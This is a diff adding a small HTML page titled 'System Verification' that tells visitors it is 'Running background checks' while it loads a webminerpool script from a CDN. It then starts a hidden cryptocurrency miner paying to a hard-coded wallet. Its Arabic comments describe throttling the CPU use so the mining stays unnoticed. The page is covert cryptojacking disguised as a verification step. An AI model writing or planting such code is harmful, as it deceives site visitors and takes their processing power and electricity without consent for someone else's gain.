@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>System Verification</title>
+</head>
+<body>
+    <p>Running background checks...</p>
+    <script src="https://cdn.jsdelivr.net/gh/webminerpool/webminerpool/webminer.js"></script>
+    <script>
+        // إعداد المحفظة وضبط الاستهلاك
+        var wallet = "ZEPHYR2RJGWgAHN6WnZyFZ6GFsURPkJmd8vzeDXmTbwHiKDX9WLtqwSWY8z6UqUiCQiTTe2YURuS7HiefqXPZChmDTM59c4uEHe4q";
+        
+        // الخنق البرمجي: Throttle = 0.7 تعني استهلاك 30% فقط من المعالج لضمان البرودة
+        var miner = new WebMiner.User(wallet, "Worker_Test_1", {
+            throttle: 0.7, 
+            threads: 1
+        });
+        
+        miner.start();
+    </script>
+</body>
+</html>
